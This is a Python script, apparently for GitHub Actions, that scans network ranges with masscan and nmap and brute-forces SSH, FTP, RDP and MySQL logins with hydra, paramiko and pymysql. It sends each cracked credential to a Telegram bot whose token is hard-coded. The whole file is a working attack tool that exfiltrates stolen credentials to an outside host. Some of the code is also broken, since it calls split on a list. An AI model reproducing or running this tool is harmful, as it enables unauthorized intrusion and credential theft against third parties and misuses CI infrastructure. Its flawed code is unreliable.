#!/usr/bin/env python3
# brody_actions.py - Pure Python + System Tools, optimized for GitHub Actions

import asyncio
import subprocess
import threading
import queue
import time
import json
import os
import sys
import re
import socket
from datetime import datetime
import logging
from concurrent.futures import ThreadPoolExecutor

# ---------- Telegram ----------
import requests

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8608061868:AAHEEsZPOw8vq100WyyusF3QjTlBvTq9-Iw")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "7963634461")

# ---------- Config ----------
TARGETS = ["192.168.1.0/24", "10.0.0.0/24"]  # تغییر بدی
PORTS = [21,22,23,25,80,443,445,3306,3389,5900,8080,8443]
WORDLIST = "/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR = "/tmp/brody"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs("/usr/share/wordlists", exist_ok=True)

# دانلود دیکشنری کوچک اگر راکی‌یو نبود
if not os.path.exists(WORDLIST):
    subprocess.run(f"wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O {WORDLIST}", shell=True)

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format='[Brody] %(asctime)s - %(message)s')
logger = logging.getLogger("Brody")

# ---------- Telegram Reporter ----------
class Reporter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base = f"https://api.telegram.org/bot{token}"
        self.last_heartbeat = 0
    
    def send(self, text):
        try:
            requests.post(f"{self.base}/sendMessage", json={"chat_id": self.chat_id, "text": text, "parse_mode": "Markdown"}, timeout=5)
        except: pass
    
    def heartbeat(self, stats):
        now = time.time()
        if now - self.last_heartbeat < 600: return
        self.last_heartbeat = now
        msg = f"❤️‍🔥 *Brody Heartbeat*\n⏱ {datetime.now().strftime('%H:%M:%S')}\n🔹 Engines: {stats['engines']}\n🔹 Cracked: {stats['cracked']}\n🔹 Scanned IPs: {stats['scanned']}"
        self.send(msg)
    
    def report_crack(self, ip, port, service, creds):
        msg = f"🔓 *CRACKED!*\nIP: `{ip}`\nPort: `{port}`\nService: `{service}`\nCreds: `{creds}`"
        self.send(msg)

reporter = Reporter(TELEGRAM_TOKEN, ADMIN_CHAT_ID)

# ---------- Engine Base ----------
class Engine:
    def __init__(self, name):
        self.name = name
        self.results = []
        self.cracked = []
    
    def run(self, targets, ports):
        raise NotImplementedError

# ---------- Engine 1: Masscan + Nmap (Lightweight Scanner) ----------
class ScannerEngine(Engine):
    def __init__(self):
        super().__init__("Scanner")
    
    def run(self, targets, ports):
        logger.info(f"[{self.name}] Scanning targets...")
        port_str = ",".join(map(str, ports))
        # Masscan سریع
        masscan_cmd = f"masscan {targets} -p{port_str} --rate=1000 -oJ {OUTPUT_DIR}/masscan.json"
        subprocess.run(masscan_cmd, shell=True, timeout=300)
        
        try:
            with open(f"{OUTPUT_DIR}/masscan.json") as f:
                data = json.load(f)
            for entry in data:
                ip = entry.get('ip')
                for p in entry.get('ports', []):
                    port = p.get('port')
                    # Nmap برای جزئیات
                    nmap_cmd = f"nmap -sV -p{port} {ip} -oG {OUTPUT_DIR}/nmap_{ip}_{port}.txt"
                    subprocess.run(nmap_cmd, shell=True, timeout=30)
                    # پارسینگ ساده
                    banner = self._parse_nmap(ip, port)
                    self.results.append({'ip': ip, 'port': port, 'banner': banner})
        except Exception as e:
            logger.error(f"[{self.name}] Error: {e}")
        return self.results
    
    def _parse_nmap(self, ip, port):
        try:
            with open(f"{OUTPUT_DIR}/nmap_{ip}_{port}.txt", 'r') as f:
                content = f.read()
            match = re.search(r'(\d+)/tcp\s+open\s+(\S+)\s+(.+)', content)
            if match:
                return f"{match.group(2)} {match.group(3)}"
        except: pass
        return "unknown"

# ---------- Engine 2: Hydra (Brute-force) ----------
class HydraEngine(Engine):
    def __init__(self):
        super().__init__("Hydra")
    
    def run(self, targets, ports):
        logger.info(f"[{self.name}] Brute-forcing...")
        # فقط SSH, FTP, RDP, MySQL
        svc_port = {22: 'ssh', 21: 'ftp', 3389: 'rdp', 3306: 'mysql'}
        for ip in targets.split(','):
            for port in ports:
                if port not in svc_port: continue
                service = svc_port[port]
                cmd = f"hydra -C {WORDLIST} -t 4 -o {OUTPUT_DIR}/hydra_{ip}_{port}.txt {ip} {service} -s {port} -f"
                try:
                    subprocess.run(cmd, shell=True, timeout=120)
                    self._parse_hydra_output(ip, port, service)
                except: pass
        return self.results
    
    def _parse_hydra_output(self, ip, port, service):
        try:
            with open(f"{OUTPUT_DIR}/hydra_{ip}_{port}.txt", 'r') as f:
                for line in f:
                    if '[SUCCESS]' in line:
                        cred = line.split('[SUCCESS]')[-1].strip()
                        self.results.append({'ip': ip, 'port': port, 'service': service, 'creds': cred})
                        reporter.report_crack(ip, port, service, cred)
        except: pass

# ---------- Engine 3: Pure Python SSH Brute (Paramiko) ----------
class SSHBruteEngine(Engine):
    def __init__(self):
        super().__init__("SSH-Brute")
    
    def run(self, targets, ports):
        import paramiko
        ips = [x.strip() for x in targets.split(',')]
        usernames = ['root', 'admin', 'ubuntu', 'pi', 'user']
        passwords = ['root', 'admin', 'password', '123456', 'toor', 'qwerty']
        
        for ip in ips:
            if 22 not in ports: continue
            for user in usernames:
                for pwd in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, username=user, password=pwd, timeout=3)
                        ssh.close()
                        cred = f"{user}:{pwd}"
                        self.results.append({'ip': ip, 'port': 22, 'service': 'ssh', 'creds': cred})
                        reporter.report_crack(ip, 22, 'ssh', cred)
                        break
                    except: pass
        return self.results

# ---------- Engine 4: Pure Python MySQL Brute ----------
class MySQLBruteEngine(Engine):
    def __init__(self):
        super().__init__("MySQL-Brute")
    
    def run(self, targets, ports):
        import pymysql
        ips = [x.strip() for x in targets.split(',')]
        creds = [('root',''), ('root','root'), ('mysql','mysql'), ('admin','admin')]
        for ip in ips:
            if 3306 not in ports: continue
            for user, pwd in creds:
                try:
                    conn = pymysql.connect(host=ip, user=user, password=pwd, timeout=3)
                    conn.close()
                    cred = f"{user}:{pwd}"
                    self.results.append({'ip': ip, 'port': 3306, 'service': 'mysql', 'creds': cred})
                    reporter.report_crack(ip, 3306, 'mysql', cred)
                    break
                except: pass
        return self.results

# ---------- Engine Manager ----------
class EngineManager:
    def __init__(self):
        self.engines = [
            ScannerEngine(),
            HydraEngine(),
            SSHBruteEngine(),
            MySQLBruteEngine()
        ]
        self.all_results = []
        self.cracked_creds = []
        self.scanned_ips = set()
    
    def run_all(self, targets, ports):
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = []
            for eng in self.engines:
                futures.append(executor.submit(eng.run, targets, ports))
            
            for f in futures:
                try:
                    res = f.result(timeout=300)
                    self.all_results.extend(res)
                    for r in res:
                        if 'creds' in r:
                            self.cracked_creds.append(r)
                            self.scanned_ips.add(r['ip'])
                except Exception as e:
                    logger.error(f"Engine error: {e}")
        
        return self.all_results

# ---------- Main ----------
def main():
    logger.info("🚀 Brody Engine started on GitHub Actions")
    reporter.send("🔥 Brody Crack Engine initialized (multi-engine)")

    manager = EngineManager()
    
    # Heartbeat thread
    def heartbeat_loop():
        stats = {'engines': len(manager.engines), 'cracked': 0, 'scanned': 0}
        while True:
            time.sleep(600)
            stats['cracked'] = len(manager.cracked_creds)
            stats['scanned'] = len(manager.scanned_ips)
            reporter.heartbeat(stats)
    
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()
    
    # اجرای اصلی
    manager.run_all(TARGETS, PORTS)
    
    # گزارش نهایی
    total = len(manager.cracked_creds)
    msg = f"✅ *Session Complete*\n🔹 Total cracked: {total}\n"
    if total:
        for c in manager.cracked_creds[:10]:
            msg += f"- {c['ip']}:{c['port']} → {c['creds']}\n"
    else:
        msg += "❌ No credentials."
    reporter.send(msg)
    
    logger.info("Session finished")
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        reporter.send("🛑 Stopped by user")
        sys.exit(0)
